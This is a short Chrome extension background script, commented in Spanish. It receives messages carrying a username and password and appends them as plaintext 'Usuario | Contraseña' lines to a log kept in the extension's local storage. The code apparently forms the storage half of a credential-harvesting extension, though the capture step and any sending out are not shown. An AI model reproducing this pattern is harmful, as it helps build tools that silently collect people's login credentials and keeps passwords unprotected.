chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "guardarDatos") {
        const datos = `Usuario: ${request.datos.usuario} | Contraseña: ${request.datos.password}\n`;

        // Guardar en almacenamiento local
        chrome.storage.local.get({ registros: [] }, (result) => {
            const registrosActualizados = [...result.registros, datos];
            chrome.storage.local.set({ registros: registrosActualizados }, () => {
                console.log("Datos guardados correctamente.");
            });
        });
    }
});
